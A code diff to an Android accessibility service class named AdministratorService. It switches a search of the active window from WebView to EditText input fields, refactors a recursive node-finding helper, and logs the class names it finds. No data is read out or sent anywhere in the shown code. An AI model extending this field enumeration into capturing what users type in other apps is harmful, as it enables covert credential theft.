@@ -17,6 +17,8 @@ import android.util.Log;
 import android.webkit.WebView;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import java.util.ArrayList;
+import android.view.View;
+import android.widget.EditText;
 
 public class AdministratorService extends BaseAccessibilityService
 {
@@ -151,7 +153,7 @@ public class AdministratorService extends BaseAccessibilityService
 				//return;
 			}
 			
-			List<AccessibilityNodeInfo> nodearr = findEveryViewNode(getRootInActiveWindow(),WebView.class.getName(),null);
+			List<AccessibilityNodeInfo> nodearr = findEveryViewNode(getRootInActiveWindow(),EditText.class.getName(),null);
 			for(AccessibilityNodeInfo i : nodearr){
 				log("uuy"+i.getClassName());
 			}
@@ -200,8 +202,11 @@ public class AdministratorService extends BaseAccessibilityService
 		
 		List<AccessibilityNodeInfo> list = new ArrayList<AccessibilityNodeInfo>();
 		
-		if (rootView != null)
+		if (rootView == null)
 		{
+			return list;
+			
+		}
 			for (int i = 0;  i < rootView.getChildCount() ;i++)
 			{
 				AccessibilityNodeInfo child = rootView.getChild(i);
@@ -222,7 +227,7 @@ public class AdministratorService extends BaseAccessibilityService
 						if(context == null){
 							list.add(child);
 						}
-						
+						else
 						if(context.equals( child.getText().toString())){
 							list.add(child);
 						}
@@ -240,10 +245,10 @@ public class AdministratorService extends BaseAccessibilityService
 
 					}
 					
-					for( AccessibilityNodeInfo node :findEveryViewNode(child,className,context)){
+					for( AccessibilityNodeInfo node : findEveryViewNode(child,className,context)){
 						list.add(node);
 					}
-				}
+				
 			}
 
 		}
